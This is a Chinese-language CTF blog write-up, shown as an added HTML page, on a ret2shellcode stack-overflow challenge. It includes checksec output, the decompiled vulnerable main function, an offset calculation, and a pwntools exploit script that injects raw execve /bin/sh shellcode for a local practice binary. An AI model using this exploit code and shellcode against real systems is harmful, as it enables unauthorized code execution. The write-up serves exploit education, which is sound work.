@@ -1,0 +1,188 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>ret2shellcode | Re1own's blog</title><meta name="keywords" content="CTF,PWN,ret2shellcode"><meta name="author" content="Re1own"><meta name="copyright" content="Re1own"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="sniperoj-pwn100-shellcode-x86-64分析题目sniperoj-pwn100-shellcode-x86-64 查看保护，ret2shellcode类型的题是没有NX保护的 123456789┌──(root💀e267254b2ec9)-[&#x2F;home&#x2F;pwn]└─# checksec shellcode [*] &amp;#x27;&#x2F;home&#x2F;pwn&#x2F;shellcode&amp;#x2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2shellcode">
+<meta property="og:url" content="https://re1own.github.io/2021/12/08/ret2shellcode/index.html">
+<meta property="og:site_name" content="Re1own&#39;s blog">
+<meta property="og:description" content="sniperoj-pwn100-shellcode-x86-64分析题目sniperoj-pwn100-shellcode-x86-64 查看保护，ret2shellcode类型的题是没有NX保护的 123456789┌──(root💀e267254b2ec9)-[&#x2F;home&#x2F;pwn]└─# checksec shellcode [*] &amp;#x27;&#x2F;home&#x2F;pwn&#x2F;shellcode&amp;#x2">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/51265145?v=4">
+<meta property="article:published_time" content="2021-12-08T16:45:01.000Z">
+<meta property="article:modified_time" content="2025-06-28T08:48:06.651Z">
+<meta property="article:author" content="Re1own">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="ret2shellcode">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://avatars.githubusercontent.com/u/51265145?v=4"><link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/51265145?v=4"><link rel="canonical" href="https://re1own.github.io/2021/12/08/ret2shellcode/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?3578e6b9b604a5b4194133e82a05cfe3";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=3079589108"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', '3079589108');
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ret2shellcode',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-06-28 04:48:06'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const now = new Date()
+          const hour = now.getHours()
+          const isNight = hour <= 6 || hour >= 18
+          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Re1own's blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://avatars.githubusercontent.com/u/51265145?v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">34</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">34</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Re1own's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">ret2shellcode</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-12-08T16:45:01.000Z" title="Created 2021-12-08 11:45:01">2021-12-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-06-28T08:48:06.651Z" title="Updated 2025-06-28 04:48:06">2025-06-28</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ret2shellcode"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="sniperoj-pwn100-shellcode-x86-64"><a href="#sniperoj-pwn100-shellcode-x86-64" class="headerlink" title="sniperoj-pwn100-shellcode-x86-64"></a>sniperoj-pwn100-shellcode-x86-64</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><a href="sniperoj-pwn100-shellcode-x86-64">题目sniperoj-pwn100-shellcode-x86-64</a></p>
+<p>查看保护，ret2shellcode类型的题是没有NX保护的</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀e267254b2ec9)-[/home/pwn]</span><br><span class="line">└─<span class="comment"># checksec shellcode </span></span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/shellcode&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<p>从main中不难发现buf泄露了它的地址，并且存在栈溢出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 buf[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Sniperoj!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Do your kown what is it : [%p] ?\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now give me your answer : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><strong>计算eip到buf的距离</strong>：断点到leave，算出buf到eip距离为rbp - rsp + 8 = 0x7fffde3d2820 - 0x7fffde3d2810 + 8 = 18 bytes</p>
+<p><img src="https://s2.loli.net/2021/12/08/bDMjrVh1OuSsCcn.png" alt="image-20211208112148036"></p>
+<p>用shellcraft生成64位的shellcode是44字节的，大于了buf上到eip能填充的18个字节，因此，shellcode不能放在buf上，而是放在eip的后面，将eip的地址保存的值覆盖为eip后面的地址，后面就是填充shellcode了，足足有0x40 - 0x10 - 8 = 0x28 = 40个字节，同样也不能用shellcraft生成的，我们去网站上找一个短的</p>
+<p>这些都行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.exploit-db.com/shellcodes/43550</span><br><span class="line"></span><br><span class="line">https://www.exploit-db.com/shellcodes/46907</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2021/12/08/kD5VgPsNjpSym3v.png" alt="1228809-20200129231359311-275271508"></p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">    buf_addr = p.recvuntil(<span class="string">&#x27;]&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    fillw_addr = <span class="built_in">int</span>(buf_addr,<span class="number">16</span>) + <span class="number">24</span> + <span class="number">8</span></span><br><span class="line">    shellcode=<span class="string">&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span><span class="comment"># 23字节的shellcode</span></span><br><span class="line">    p.sendline(<span class="number">24</span>*<span class="string">&#x27;a&#x27;</span>+p64(fillw_addr)+shellcode)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>打通！</p>
+<p><img src="https://s2.loli.net/2021/12/08/8HGw6vXP3zhWJis.png" alt="image-20211208113140681"></p>
+<h2 id="references"><a href="#references" class="headerlink" title="references"></a>references</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Mayfly-nymph/p/12239445.html#ret2shellcode">栈溢出练习(1) - Hk_Mayfly - 博客园 (cnblogs.com)</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Re1own</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://re1own.github.io/2021/12/08/ret2shellcode/">https://re1own.github.io/2021/12/08/ret2shellcode/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/PWN/">PWN</a><a class="post-meta__tags" href="/tags/ret2shellcode/">ret2shellcode</a></div><div class="post_share"><div class="social-share" data-image="https://avatars.githubusercontent.com/u/51265145?v=4" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://i.loli.net/2021/10/21/syOvRWB2DejXGZc.png" target="_blank"><img class="post-qr-code-img" src="https://i.loli.net/2021/10/21/syOvRWB2DejXGZc.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://i.loli.net/2021/10/21/FKSPZJviGNdp4Y1.png" target="_blank"><img class="post-qr-code-img" src="https://i.loli.net/2021/10/21/FKSPZJviGNdp4Y1.png" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/12/09/ret2syscall/"><img class="prev-cover" src="https://avatars.githubusercontent.com/u/51265145?v=4" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">ret2syscall</div></div></a></div><div class="next-post pull-right"><a href="/2021/11/30/%E6%9C%AA%E7%9F%A5libc%E7%9A%84ret2libc-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/"><img class="next-cover" src="https://avatars.githubusercontent.com/u/51265145?v=4" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">未知libc的ret2libc_攻防世界pwn-100</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2020/11/24/PWN-64%E4%BD%8DROP-Bugku-PWN4/" title="PWN-64位ROP-Bugku_PWN4"><img class="cover" src="https://avatars.githubusercontent.com/u/51265145?v=4" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-24</div><div class="title">PWN-64位ROP-Bugku_PWN4</div></div></a></div><div><a href="/2020/11/24/PWN-pwnable-kr-fd/" title="PWN-pwnable.kr.fd"><img class="cover" src="https://avatars.githubusercontent.com/u/51265145?v=4" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-24</div><div class="title">PWN-pwnable.kr.fd</div></div></a></div><div><a href="/2020/11/24/PWN-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA-%E6%A0%88%E6%BA%A2%E5%87%BA-bugku-pwn11/" title="PWN-整数溢出&栈溢出-bugku_pwn11"><img class="cover" src="https://avatars.githubusercontent.com/u/51265145?v=4" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-24</div><div class="title">PWN-整数溢出&栈溢出-bugku_pwn11</div></div></a></div><div><a href="/2020/11/24/PWN-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E6%A3%80%E6%B5%8B/" title="PWN-格式化字符串-攻防世界_实时数据检测"><img class="cover" src="https://avatars.githubusercontent.com/u/51265145?v=4" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-24</div><div class="title">PWN-格式化字符串-攻防世界_实时数据检测</div></div></a></div><div><a href="/2020/11/24/PWN-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCGfsb/" title="PWN-格式化字符串漏洞-攻防世界CGfsb"><img class="cover" src="https://avatars.githubusercontent.com/u/51265145?v=4" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-24</div><div class="title">PWN-格式化字符串漏洞-攻防世界CGfsb</div></div></a></div><div><a href="/2021/11/30/ROP-64%E4%BD%8D-ret2libc/" title="ROP-64位-ret2libc"><img class="cover" src="https://avatars.githubusercontent.com/u/51265145?v=4" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-30</div><div class="title">ROP-64位-ret2libc</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://avatars.githubusercontent.com/u/51265145?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Re1own</div><div class="author-info__description">Focusing on Side Channel Attack</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">34</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">34</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Re1own"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Re1own" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:hzhou9@gmu.edu" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://scholar.google.com/citations?user=ghqxQuAAAAAJ" target="_blank" title="Google Scholar"><i class="fas fa-graduation-cap"></i></a><a class="social-icon" href="https://re1own.github.io/assets/document/Huizhen_Zhou_Resume1.pdf" target="_blank" title="CV"><i class="fas fa-file-alt"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">Focus on Side Channel Attack</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sniperoj-pwn100-shellcode-x86-64"><span class="toc-number">1.</span> <span class="toc-text">sniperoj-pwn100-shellcode-x86-64</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">1.3.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#references"><span class="toc-number">1.4.</span> <span class="toc-text">references</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/06/18/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/" title="理解AES_S-box盒生成">理解AES_S-box盒生成</a><time datetime="2023-06-18T07:48:16.000Z" title="Created 2023-06-18 03:48:16">2023-06-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/26/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E7%94%A8DPA%E6%94%BB%E5%87%BB%E5%9B%BA%E4%BB%B6%E4%B8%AD%E7%9A%84AES/" title="测信道攻击——用DPA攻击固件中的AES">测信道攻击——用DPA攻击固件中的AES</a><time datetime="2023-05-27T02:26:36.000Z" title="Created 2023-05-26 22:26:36">2023-05-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/25/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8%E4%B8%80%E4%B8%AAbit%E6%81%A2%E5%A4%8DAES-key/" title="测信道攻击——利用一个bit恢复AES key">测信道攻击——利用一个bit恢复AES key</a><time datetime="2023-05-25T05:19:16.000Z" title="Created 2023-05-25 01:19:16">2023-05-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/24/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94Hamming-Weight-Swings/" title="测信道攻击——Hamming Weight Swings">测信道攻击——Hamming Weight Swings</a><time datetime="2023-05-25T01:27:14.000Z" title="Created 2023-05-24 21:27:14">2023-05-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/24/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8%E8%83%BD%E8%80%97%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/" title="测信道攻击——利用能耗破解密码">测信道攻击——利用能耗破解密码</a><time datetime="2023-05-24T07:40:37.000Z" title="Created 2023-05-24 03:40:37">2023-05-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Re1own</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="true" data-text="Hardware,Security" data-fontsize="20px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
